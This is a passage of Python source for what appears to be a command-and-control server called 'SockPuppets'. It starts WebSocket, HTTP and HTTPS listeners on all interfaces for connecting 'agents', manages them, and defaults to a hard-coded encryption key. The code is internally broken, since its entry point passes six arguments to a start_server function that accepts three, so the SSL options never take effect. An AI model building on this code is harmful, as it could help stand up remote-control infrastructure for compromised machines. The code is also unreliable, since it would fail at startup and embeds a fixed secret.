    async def start_ws_listener(self, host: str = '0.0.0.0', port: int = 8443):
        """Start WebSocket listener"""
        listener_name = f"ws_{port}"
        if listener_name in self.listeners:
            logger.warning(f"WebSocket listener already running on port {port}")
            return

        logger.info(f"Starting WebSocket listener on {host}:{port}")
        server = await websockets.serve(self.handle_agent, host, port, max_size=10485760)

        self.listeners[listener_name] = {
            'type': 'websocket',
            'host': host,
            'port': port,
            'server': server,
            'started_at': datetime.now().isoformat()
        }
        logger.info(f"WebSocket listener started on {host}:{port}")

    async def start_http_listener(self, host: str = '0.0.0.0', port: int = 8080):
        """Start HTTP listener"""
        if web is None:
            raise ImportError("aiohttp is required for HTTP listeners. Install with: pip install aiohttp")

        listener_name = f"http_{port}"
        if listener_name in self.listeners:
            logger.warning(f"HTTP listener already running on port {port}")
            return

        app = self._create_http_app()
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host, port)
        await site.start()

        self.listeners[listener_name] = {
            'type': 'http',
            'host': host,
            'port': port,
            'runner': runner,
            'site': site,
            'started_at': datetime.now().isoformat()
        }
        logger.info(f"HTTP listener started on {host}:{port}")

    async def start_https_listener(self, host: str = '0.0.0.0', port: int = 443,
                                    cert_path: Optional[str] = None, key_path: Optional[str] = None):
        """Start HTTPS listener"""
        if web is None:
            raise ImportError("aiohttp is required for HTTPS listeners. Install with: pip install aiohttp")

        listener_name = f"https_{port}"
        if listener_name in self.listeners:
            logger.warning(f"HTTPS listener already running on port {port}")
            return

        ssl_ctx = self._get_ssl_context(cert_path, key_path)
        if ssl_ctx is None:
            raise RuntimeError("Failed to create SSL context")

        app = self._create_http_app()
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, host, port, ssl_context=ssl_ctx)
        await site.start()

        self.listeners[listener_name] = {
            'type': 'https',
            'host': host,
            'port': port,
            'runner': runner,
            'site': site,
            'ssl_context': ssl_ctx,
            'started_at': datetime.now().isoformat()
        }
        logger.info(f"HTTPS listener started on {host}:{port}")

    async def stop_listener(self, listener_type: Optional[str] = None):
        """Stop listener(s). If type is None, stop all."""
        to_remove = []
        for name, info in self.listeners.items():
            if listener_type is None or info['type'] == listener_type:
                try:
                    if info['type'] == 'websocket':
                        info['server'].close()
                        await info['server'].wait_closed()
                    else:
                        await info['runner'].cleanup()
                    logger.info(f"Stopped {info['type'].upper()} listener on port {info['port']}")
                except Exception as e:
                    logger.error(f"Error stopping listener {name}: {e}")
                to_remove.append(name)

        for name in to_remove:
            del self.listeners[name]

    def get_listeners(self) -> list:
        """Get list of active listeners"""
        result = []
        for name, info in self.listeners.items():
            result.append({
                'name': name,
                'type': info['type'],
                'host': info['host'],
                'port': info['port'],
                'started_at': info['started_at']
            })
        return result

    async def start(self, host: str = '0.0.0.0', port: int = 8443):
        """Start the server (WebSocket listener, backward compatible)"""
        await self.start_ws_listener(host, port)
        await asyncio.Future()  # Run forever


# Global server instance
server_instance = None

def get_server_instance():
    """Get or create server instance"""
    global server_instance
    if server_instance is None:
        server_instance = SockPuppetsServer()
    return server_instance


async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
    """Start the server (backward compatible)"""
    global server_instance
    server_instance = SockPuppetsServer(encryption_key)
    await server_instance.start(host, port)


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='SockPuppets Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
    parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
    parser.add_argument('--ssl', action='store_true', help='Enable WSS (TLS) mode')
    parser.add_argument('--cert', type=str, help='Path to SSL certificate file')
    parser.add_argument('--cert-key', type=str, help='Path to SSL private key file')
    args = parser.parse_args()

    asyncio.run(start_server(args.host, args.port, args.key, args.ssl, args.cert, getattr(args, 'cert_key', None)))
